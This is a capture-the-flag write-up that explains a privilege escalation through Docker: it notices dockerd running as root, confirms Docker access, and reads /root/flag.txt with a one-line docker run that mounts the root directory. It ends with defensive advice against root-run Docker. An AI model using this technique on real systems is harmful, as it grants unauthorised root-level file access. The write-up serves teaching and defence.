# i am groot.

## Brief

```
ssh -p2222 saintcon@54.214.94.66

password: saintcon

Get the flag in /root/flag.txt
```

## Process

Fundamentally, we need a way to escalate our privileges to `root` level so that we can read the flag.

The trick of this challenge is to determine what kind of environment you are running in. One easy way is to use TOP:

```
  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
   70 root      20   0  424828  37752  20836 S   0.3  0.9   3:05.45 docker-containe
    1 root      20   0   65508   6168   5460 S   0.0  0.2   0:00.03 sshd
   63 root      20   0  649396  79896  40444 S   0.0  2.0   1:15.35 dockerd
 1137 saintcon  20   0   48956   9448   3300 S   0.0  0.2   0:02.45 [agentd] - SLEE
 3602 root      20   0   90480   6600   5708 S   0.0  0.2   0:00.00 sshd
 3611 saintcon  20   0   90480   3276   2384 S   0.0  0.1   0:00.00 sshd
 3612 saintcon  20   0   18248   3288   2812 S   0.0  0.1   0:00.00 bash
 3622 saintcon  20   0   36688   3068   2576 R   0.0  0.1   0:00.00 top
```

So, we see some user sessions, and we also see `dockerd` running as root. Now, that looks interesting. 
An escalation of privileges vulnerability really just means that there's a way to run arbitrary code as a privileged user.
What is Docker?  Well, it's a way to run arbitrary code...and it's running as `root`.  Oops!

To confirm that we've got Docker available, let's run `docker version`:

```
Client:
 Version:           18.06.1-ce
 API version:       1.38
 Go version:        go1.10.3
 Git commit:        e68fc7a
 Built:             Tue Aug 21 17:24:56 2018
 OS/Arch:           linux/amd64
 Experimental:      false

Server:
 Engine:
  Version:          18.06.1-ce
  API version:      1.38 (minimum version 1.12)
  Go version:       go1.10.3
  Git commit:       e68fc7a
  Built:            Tue Aug 21 17:23:21 2018
  OS/Arch:          linux/amd64
  Experimental:     false
```

Hooray! Time to end our reconnaisance and start exploitation!

```
docker run --rm -v /root/:/pwned bash cat /pwned/flag.txt
```

TADA!

# Takeways

Don't run Docker as root!  See [The Docker docs](https://docs.docker.com/install/linux/linux-postinstall/#manage-docker-as-a-non-root-user) for details.
